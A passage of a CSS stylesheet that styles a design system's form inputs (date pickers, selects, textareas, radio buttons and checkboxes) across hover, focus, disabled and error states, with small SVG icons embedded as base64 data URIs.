            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+CiAgPGRlZnM+CiAgICA8c3R5bGU+CiAgICAgIC5hIHsKICAgICAgICBmaWxsOiAjZDFjOWMwOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvZGVmcz4KICA8dGl0bGU+ZGF0ZVBpY2tlcjwvdGl0bGU+CiAgPHBhdGggY2xhc3M9ImEiIGQ9Ik0xLjAyLDEuMjA5VjE4Ljc5MUgxOC45NzlWMS4yMDlIMS4wMlptMTQuOSwxLjM0NmExLjA0LDEuMDQsMCwxLDEtMS4wNDEsMS4wNEExLjAzOSwxLjAzOSwwLDAsMSwxNS45MTksMi41NTRabS0xMS45NzcsMEExLjA0LDEuMDQsMCwxLDEsMi45LDMuNTk0LDEuMDQsMS4wNCwwLDAsMSwzLjk0MiwyLjU1NFpNNS4zLDE3LjE2NEgyLjl2LTIuNEg1LjN2Mi40Wm0wLTMuNjY5SDIuOVYxMS4xSDUuM3YyLjRabTAtMy42NjdIMi45di0yLjRINS4zdjIuNFptMy45LDcuMzM2SDYuOHYtMi40SDkuMnYyLjRabTAtMy42NjlINi44VjExLjFIOS4ydjIuNFptMC0zLjY2N0g2Ljh2LTIuNEg5LjJ2Mi40Wk0xMy4xLDEzLjVIMTAuN1YxMS4xaDIuNHYyLjRabTAtMy42NjdIMTAuN3YtMi40aDIuNHYyLjRabTMuOSwzLjY2N2gtMi40VjExLjFoMi40djIuNFptMC0zLjY2N2gtMi40di0yLjRoMi40djIuNFoiLz4KPC9zdmc+Cg==");
            background-position: calc(100% - 10px);
            background-repeat: no-repeat;
            background-size: 22px 22px;
            background-color: #ffffff
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.datepicker:focus {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+CiAgPGRlZnM+CiAgICA8c3R5bGU+CiAgICAgIC5hIHsKICAgICAgICBmaWxsOiAjMDA3M2NmOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvZGVmcz4KICA8dGl0bGU+ZGF0ZVBpY2tlcjwvdGl0bGU+CiAgPHBhdGggY2xhc3M9ImEiIGQ9Ik0xLjAyLDEuMjA5VjE4Ljc5MUgxOC45NzlWMS4yMDlIMS4wMlptMTQuOSwxLjM0NmExLjA0LDEuMDQsMCwxLDEtMS4wNDEsMS4wNEExLjAzOSwxLjAzOSwwLDAsMSwxNS45MTksMi41NTRabS0xMS45NzcsMEExLjA0LDEuMDQsMCwxLDEsMi45LDMuNTk0LDEuMDQsMS4wNCwwLDAsMSwzLjk0MiwyLjU1NFpNNS4zLDE3LjE2NEgyLjl2LTIuNEg1LjN2Mi40Wm0wLTMuNjY5SDIuOVYxMS4xSDUuM3YyLjRabTAtMy42NjdIMi45di0yLjRINS4zdjIuNFptMy45LDcuMzM2SDYuOHYtMi40SDkuMnYyLjRabTAtMy42NjlINi44VjExLjFIOS4ydjIuNFptMC0zLjY2N0g2Ljh2LTIuNEg5LjJ2Mi40Wk0xMy4xLDEzLjVIMTAuN1YxMS4xaDIuNHYyLjRabTAtMy42NjdIMTAuN3YtMi40aDIuNHYyLjRabTMuOSwzLjY2N2gtMi40VjExLjFoMi40djIuNFptMC0zLjY2N2gtMi40di0yLjRoMi40djIuNFoiLz4KPC9zdmc+Cg==") !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.datepicker:disabled {
            border-color: #ece6dd !important;
            background-color: #fdfcfb !important;
            color: #857B70 !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.datepicker:disabled.datepicker {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+CiAgPGRlZnM+CiAgICA8c3R5bGU+CiAgICAgIC5hIHsKICAgICAgICBmaWxsOiAjZDFjOWMwOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvZGVmcz4KICA8dGl0bGU+ZGF0ZVBpY2tlcjwvdGl0bGU+CiAgPHBhdGggY2xhc3M9ImEiIGQ9Ik0xLjAyLDEuMjA5VjE4Ljc5MUgxOC45NzlWMS4yMDlIMS4wMlptMTQuOSwxLjM0NmExLjA0LDEuMDQsMCwxLDEtMS4wNDEsMS4wNEExLjAzOSwxLjAzOSwwLDAsMSwxNS45MTksMi41NTRabS0xMS45NzcsMEExLjA0LDEuMDQsMCwxLDEsMi45LDMuNTk0LDEuMDQsMS4wNCwwLDAsMSwzLjk0MiwyLjU1NFpNNS4zLDE3LjE2NEgyLjl2LTIuNEg1LjN2Mi40Wm0wLTMuNjY5SDIuOVYxMS4xSDUuM3YyLjRabTAtMy42NjdIMi45di0yLjRINS4zdjIuNFptMy45LDcuMzM2SDYuOHYtMi40SDkuMnYyLjRabTAtMy42NjlINi44VjExLjFIOS4ydjIuNFptMC0zLjY2N0g2Ljh2LTIuNEg5LjJ2Mi40Wk0xMy4xLDEzLjVIMTAuN1YxMS4xaDIuNHYyLjRabTAtMy42NjdIMTAuN3YtMi40aDIuNHYyLjRabTMuOSwzLjY2N2gtMi40VjExLjFoMi40djIuNFptMC0zLjY2N2gtMi40di0yLjRoMi40djIuNFoiLz4KPC9zdmc+Cg==")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.datepicker.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.datepicker.spa-error-form-input--required {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+CiAgPGRlZnM+CiAgICA8c3R5bGU+CiAgICAgIC5hIHsKICAgICAgICBmaWxsOiAjZGMxNDMxOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvZGVmcz4KICA8dGl0bGU+ZGF0ZVBpY2tlcjwvdGl0bGU+CiAgPHBhdGggY2xhc3M9ImEiIGQ9Ik0xLjAyLDEuMjA5VjE4Ljc5MUgxOC45NzlWMS4yMDlIMS4wMlptMTQuOSwxLjM0NmExLjA0LDEuMDQsMCwxLDEtMS4wNDEsMS4wNEExLjAzOSwxLjAzOSwwLDAsMSwxNS45MTksMi41NTRabS0xMS45NzcsMEExLjA0LDEuMDQsMCwxLDEsMi45LDMuNTk0LDEuMDQsMS4wNCwwLDAsMSwzLjk0MiwyLjU1NFpNNS4zLDE3LjE2NEgyLjl2LTIuNEg1LjN2Mi40Wm0wLTMuNjY5SDIuOVYxMS4xSDUuM3YyLjRabTAtMy42NjdIMi45di0yLjRINS4zdjIuNFptMy45LDcuMzM2SDYuOHYtMi40SDkuMnYyLjRabTAtMy42NjlINi44VjExLjFIOS4ydjIuNFptMC0zLjY2N0g2Ljh2LTIuNEg5LjJ2Mi40Wk0xMy4xLDEzLjVIMTAuN1YxMS4xaDIuNHYyLjRabTAtMy42NjdIMTAuN3YtMi40aDIuNHYyLjRabTMuOSwzLjY2N2gtMi40VjExLjFoMi40djIuNFptMC0zLjY2N2gtMi40di0yLjRoMi40djIuNFoiLz4KPC9zdmc+Cg==")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-prefix--currency {
            display: inline-block;
            position: relative;
            top: 2px;
            margin-right: -22px;
            padding-left: 10px;
            font: 20px/20px Arial;
            z-index: 31;
            color: #333
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-prefix--currency+.spa-input-text {
            padding-left: 25px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box.spa-input-box--textarea.has-help .spa-input-label {
            display: inline-block;
            margin-bottom: 10px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box.spa-input-box--textarea.has-help .toggle-trigger {
            margin: 0 0 0 10px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box.spa-input-box--textarea.has-limit .spa-input-label {
            display: inline-block
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-char-count {
            background-color: #fff;
            color: #524940;
            display: none;
            position: relative;
            right: 5px;
            float: right;
            padding-left: 3px;
            margin: 0;
            text-align: right;
            font-size: 12px;
            z-index: 11
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-char-count--loaded {
            display: block
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-char-count--scrollbar {
            right: 17px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea {
            height: 124px;
            position: relative;
            padding: 10px 10px 20px 10px;
            margin: 0 0 0 0;
            border: 1px solid #d1c9c0;
            font-size: 20px;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s;
            z-index: 10;
            box-shadow: none;
            resize: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea:hover {
            border-color: #9d8e80
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea:focus {
            border-color: #0073CF !important;
            background-color: #fff
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea:disabled {
            border-color: #ece6dd !important;
            background-color: #fdfcfb !important;
            color: #857B70 !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea:disabled~.spa-input-hint {
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+PHRpdGxlPmNhcmF0X2RlZmF1bHQ8L3RpdGxlPjxwb2x5Z29uIHBvaW50cz0iMi40NjUgNy4yNTkgNC41MjUgNS4xOTkgMTAuMDgxIDEwLjc1NCAxNS42MzcgNS4xOTcgMTcuNjk5IDcuMjU3IDEwLjA4MSAxNC44NzcgMi40NjUgNy4yNTkiIHN0eWxlPSJmaWxsOiM4NTczNjMiLz48L3N2Zz4=");
            background-color: #ffffff;
            background-position: calc(100% - 10px) center;
            background-repeat: no-repeat;
            background-size: 22px 22px;
            height: 40px;
            margin: 0 0 1px 0;
            padding-right: 40px;
            border: 1px solid #d1c9c0;
            font-size: 18px;
            z-index: 10;
            outline: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select~.toggle-trigger-box::before {
            content: '';
            display: inline-block;
            height: 28px;
            border-left: 1px solid #ece6dd;
            margin-top: 5px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select .toggle-trigger {
            z-index: 10
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select:disabled {
            border-color: #ece6dd !important;
            background-color: #fdfcfb !important;
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select:disabled option {
            color: #857B70 !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select:disabled~.toggle-trigger-box {
            background-color: transparent !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select:disabled~.spa-input-hint {
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select.spa-error-form-input--required {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+PGRlZnM+PHN0eWxlPi5hIHsgZmlsbDogI2RjMWUzMjsgfTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5jYXJhdDwvdGl0bGU+PHBhdGggY2xhc3M9ImEiIGQ9Ik0yLjM4MyA3LjIyMmwyLjA2LTIuMDYgNS41NTYgNS41NTQgNS41NTYtNS41NTYgMi4wNjIgMi4wNi03LjYxOCA3LjYyLTcuNjE2LTcuNjE4eiIvPjwvc3ZnPg==")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select:focus {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+PGRlZnM+PHN0eWxlPi5hIHsgZmlsbDogIzJiNzJiOTsgfTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5jYXJhdDwvdGl0bGU+PHBhdGggY2xhc3M9ImEiIGQ9Ik0yLjM4MyA3LjIyMmwyLjA2LTIuMDYgNS41NTYgNS41NTQgNS41NTYtNS41NTYgMi4wNjIgMi4wNi03LjYxOCA3LjYyLTcuNjE2LTcuNjE4eiIvPjwvc3ZnPg==") !important;
            border-color: #0073CF !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select:focus~.spa-input-hint {
            border-color: #000a23
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select:focus~.toggle-trigger-box .toggle-trigger {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMiAyMiI+PHRpdGxlPnF1ZXN0aW9uLW1hcms8L3RpdGxlPjxwYXRoIGQ9Ik0yMSAxMWExMCAxMCAwIDEgMS0xMC0xMCAxMCAxMCAwIDAgMSAxMCAxMHoiIGZpbGw9IiMyYjcyYjkiLz48cGF0aCBkPSJNMTEuMTQgNi44MzdhMS42MTYgMS42MTYgMCAwIDAtMS4xNDguMzQ0LjkuOSAwIDAgMSAuNC43NDYgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuNjI5IDEuNjI5IDAgMCAxLS45NzYuNCAxLjM4NCAxLjM4NCAwIDAgMS0xLjAzMy0uNCAxLjQyOSAxLjQyOSAwIDAgMS0uNC0xLjA5MSAyLjI1MiAyLjI1MiAwIDAgMSAxLjA4OC0xLjk1NSA0LjczNyA0LjczNyAwIDAgMSAyLjc1Ni0uOCA0LjI1NCA0LjI1NCAwIDAgMSAyLjY0MS44IDIuNTExIDIuNTExIDAgMCAxIC45NzYgMi4xMjQgMi43MzcgMi43MzcgMCAwIDEtLjIzIDEuMTQ4IDMuMzQ1IDMuMzQ1IDAgMCAxLS42MzIuODYxIDE0LjI2MyAxNC4yNjMgMCAwIDAtMS4zNzggMS4wMzMgNS4xNzcgNS4xNzcgMCAwIDAtLjUxNy41NzRsLS4yODcuNjg2YS45NDUuOTQ1IDAgMCAxLS4yMy41MiAxLjMzOSAxLjMzOSAwIDAgMS0uNjMyLjExNWgtLjUxNGEuOS45IDAgMCAxLS43NDYtLjIzIDEuMTQ2IDEuMTQ2IDAgMCAxLS4yMy0uNzQ2di0uNDU0YzAtLjQuNjg5LS42MzIgMS40OTMtMS4wOTEgMS4zNzgtMS4xNDggMS4zNzgtMS43MjIgMS4zNzgtMi4zNTRhLjkzMS45MzEgMCAwIDAtLjQtLjggMS4xODIgMS4xODIgMCAwIDAtLjk3OS0uMzQ5em0tLjM0IDEwLjE2M2ExLjE0MiAxLjE0MiAwIDAgMS0uOTE5LS40IDEuMzU1IDEuMzU1IDAgMCAxLS40LS45MTkgMS4xNDIgMS4xNDIgMCAwIDEgLjQtLjkxOSAxLjM1NSAxLjM1NSAwIDAgMSAuOTE5LS40IDEuMTQyIDEuMTQyIDAgMCAxIC45MTkuNCAxLjM1NSAxLjM1NSAwIDAgMSAuNC45MTkgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuMTQyIDEuMTQyIDAgMCAxLS45MTkuNHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select:focus~.toggle-trigger-box:hover .toggle-trigger {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMiAyMiI+PHRpdGxlPnF1ZXN0aW9uLW1hcms8L3RpdGxlPjxwYXRoIGQ9Ik0yMSAxMWExMCAxMCAwIDEgMS0xMC0xMCAxMCAxMCAwIDAgMSAxMCAxMHoiIGZpbGw9IiMyYjU5YTgiLz48cGF0aCBkPSJNMTEuMTQgNi44MzdhMS42MTYgMS42MTYgMCAwIDAtMS4xNDguMzQ0LjkuOSAwIDAgMSAuNC43NDYgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuNjI5IDEuNjI5IDAgMCAxLS45NzYuNCAxLjM4NCAxLjM4NCAwIDAgMS0xLjAzMy0uNCAxLjQyOSAxLjQyOSAwIDAgMS0uNC0xLjA5MSAyLjI1MiAyLjI1MiAwIDAgMSAxLjA4OC0xLjk1NSA0LjczNyA0LjczNyAwIDAgMSAyLjc1Ni0uOCA0LjI1NCA0LjI1NCAwIDAgMSAyLjY0MS44IDIuNTExIDIuNTExIDAgMCAxIC45NzYgMi4xMjQgMi43MzcgMi43MzcgMCAwIDEtLjIzIDEuMTQ4IDMuMzQ1IDMuMzQ1IDAgMCAxLS42MzIuODYxIDE0LjI2MyAxNC4yNjMgMCAwIDAtMS4zNzggMS4wMzMgNS4xNzcgNS4xNzcgMCAwIDAtLjUxNy41NzRsLS4yODcuNjg2YS45NDUuOTQ1IDAgMCAxLS4yMy41MiAxLjMzOSAxLjMzOSAwIDAgMS0uNjMyLjExNWgtLjUxNGEuOS45IDAgMCAxLS43NDYtLjIzIDEuMTQ2IDEuMTQ2IDAgMCAxLS4yMy0uNzQ2di0uNDU0YzAtLjQuNjg5LS42MzIgMS40OTMtMS4wOTEgMS4zNzgtMS4xNDggMS4zNzgtMS43MjIgMS4zNzgtMi4zNTRhLjkzMS45MzEgMCAwIDAtLjQtLjggMS4xODIgMS4xODIgMCAwIDAtLjk3OS0uMzQ5em0tLjM0IDEwLjE2M2ExLjE0MiAxLjE0MiAwIDAgMS0uOTE5LS40IDEuMzU1IDEuMzU1IDAgMCAxLS40LS45MTkgMS4xNDIgMS4xNDIgMCAwIDEgLjQtLjkxOSAxLjM1NSAxLjM1NSAwIDAgMSAuOTE5LS40IDEuMTQyIDEuMTQyIDAgMCAxIC45MTkuNCAxLjM1NSAxLjM1NSAwIDAgMSAuNC45MTkgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuMTQyIDEuMTQyIDAgMCAxLS45MTkuNHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.spa-error-form-input--required,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea.spa-error-form-input--required,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select.spa-error-form-input--required {
            border-color: #DC1431
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.spa-error-form-input--validation:focus,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.spa-error-form-input--required:focus,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea.spa-error-form-input--validation:focus,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-textarea.spa-error-form-input--required:focus,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select.spa-error-form-input--validation:focus,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-select.spa-error-form-input--required:focus {
            border-color: #DC1431
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box.has-help.spa-input-box .spa-input-text.datepicker,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box.has-help.spa-input-box .spa-input-select {
            background-position: calc(100% - 48px) center;
            padding-right: 78px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box.has-help .spa-input-text {
            padding-right: 44px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-error-message {
            margin: 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-label {
            font-size: 14px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options .toggle-trigger {
            display: inline-block
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper {
            position: relative;
            margin: 0 0 16px 0;
            font-size: 16px;
            line-height: 16px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper:last-child {
            margin-bottom: 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option {
            width: 30px;
            height: 30px;
            position: relative;
            opacity: 0;
            z-index: 3
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option~.spa-input-check {
            width: 30px;
            height: 30px;
            position: absolute;
            top: 0;
            left: 0;
            border: 1px solid #d1c9c0;
            background-color: #ffffff;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s;
            z-index: 1
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option~.spa-input-check:after {
            content: '';
            width: 0px;
            height: 0px;
            position: absolute;
            top: 14px;
            left: 14px;
            border: 0 solid transparent;
            background: transparent none repeat scroll 0 0;
            -webkit-transition: all 0.25s ease-in-out;
            transition: all 0.25s ease-in-out;
            z-index: 2;
            opacity: 0.2
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:focus~.spa-input-check:after {
            width: 0;
            height: 0;
            opacity: 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:hover~.spa-input-check:after {
            width: 8px;
            height: 8px;
            top: 10px;
            left: 10px;
            opacity: 0.2
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:hover:disabled~.spa-input-check:after,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:focus:disabled~.spa-input-check:after {
            opacity: 0;
            width: 0;
            height: 0;
            top: 14px;
            left: 14px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:hover:disabled~label,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:focus:disabled~label {
            font-weight: normal
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:disabled~.spa-input-check {
            background-color: #fdfcfb;
            border-color: #ece6dd
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:disabled~.spa-input-check:after {
            border-color: #d1c9c0;
            background-color: #d1c9c0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:disabled~.spa-input-check~label {
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:hover~.spa-input-check {
            border: 1px solid #0073cf
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:hover~.spa-input-check:after {
            border: 1px solid #0073cf;
            background-color: #0073cf
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:focus~.spa-input-check {
            border: 1px solid #0073cf !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:focus~.spa-input-check:after {
            border: 1px solid #0073cf !important;
            background-color: #0073cf
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:hover:disabled~.spa-input-check,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:focus:disabled~.spa-input-check,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:checked:disabled~.spa-input-check {
            border-color: #ece6dd;
            background-color: #fdfcfb;
            box-shadow: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:hover:disabled~.spa-input-hint,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:focus:disabled~.spa-input-hint,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option:checked:disabled~.spa-input-hint {
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option.spa-error-form-input--validation~.spa-input-check,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option.spa-error-form-input--required~.spa-input-check {
            border-color: #DC1431
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option.spa-error-form-input--validation~.spa-input-check:focus,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option.spa-error-form-input--validation~.spa-input-check:hover,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option.spa-error-form-input--required~.spa-input-check:focus,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option.spa-error-form-input--required~.spa-input-check:hover {
            border-color: #DC1431
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio~.spa-input-check {
            border-radius: 16px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio~.spa-input-check:after {
            border-radius: 8px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio:hover~.spa-input-check:after,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio:focus~.spa-input-check:after {
            border-radius: 8px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio:checked~.spa-input-check {
            border: 1px solid #0073cf
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio:checked~.spa-input-check:after {
            border: 1px solid #0073cf;
            background-color: #0073cf;
            opacity: 1 !important;
            width: 16px;
            height: 16px;
            top: 6px;
            left: 6px;
            border-radius: 16px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio:checked:disabled~.spa-input-check:after {
            border-color: #ece6dd;
            background-color: #9d8e80
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio:checked:disabled~.spa-input-hint {
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio:checked:disabled:checked~.spa-input-check:after {
            opacity: 1 !important;
            width: 16px;
            height: 16px;
            top: 6px;
            left: 6px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--radio:checked~label {
            font-weight: bold !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--checkbox:checked~.spa-input-check {
            background-color: #0073cf
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--checkbox:checked~.spa-input-check:after {
            content: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--checkbox:checked~.spa-input-check:before {
            content: '';
            position: absolute;
            border: 0 solid transparent;
            border-left: 4px solid #ffffff;
            border-bottom: 4px solid #ffffff;
            background: transparent none repeat scroll 0 0;
            -webkit-transition: all 0.25s ease-in-out;
            transition: all 0.25s ease-in-out;
            width: 20px;
            height: 11px;
            top: 6px;
            left: 4px;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg)
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--checkbox:checked:disabled~.spa-input-check {
            border-color: #ece6dd;
            background-color: #9d8e80
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--checkbox:checked:disabled~.spa-input-check:before {
            border-left-color: #f9f7f4;
            border-bottom-color: #f9f7f4
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option--checkbox:checked:disabled~.spa-input-hint {
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option-label {
            display: inline-block;
            margin: 0;
            font-size: 14px;
            line-height: 16px;
            padding: 7px 0 0 12px;
            vertical-align: top;
            max-width: calc(100% - 42px)
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option-label.spa-error-form-label--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper .spa-input-option-label.spa-error-form-label--required {
            color: #DC1431
        }

